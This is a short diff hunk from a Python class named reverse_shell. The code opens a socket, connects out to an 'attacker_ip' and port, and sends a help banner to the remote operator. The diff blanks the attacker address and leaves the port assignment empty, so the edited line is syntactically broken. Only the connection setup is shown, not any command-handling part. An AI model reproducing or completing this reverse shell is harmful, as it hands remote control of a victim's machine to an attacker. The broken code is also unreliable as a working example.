@@ -10,9 +10,9 @@ class reverse_shell:
        def __init__(self):
               self.protocol = 'utf-8'
               self.sock = socket.socket(socket.AF_INET)
-              self.attacker_ip  = '0.0.0.0'
+              self.attacker_ip  = ''
               self.size = 1024
-              self.port = 5555
+              self.port = 
        def mainn(self):
               self.sock.connect((self.attacker_ip,self.port))
               self.sock.send(bytes('\ntype help to see the things u can do',self.protocol))
